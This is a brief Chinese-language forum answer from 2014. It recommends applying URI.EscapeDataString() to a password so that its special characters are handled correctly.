> 赞同：1
> 
> 时间：2014-09-12T10:37:34.427

在您的密码中使用 URI.EscapeDataString() 方法。它将帮助您正确阅读您的特殊字符。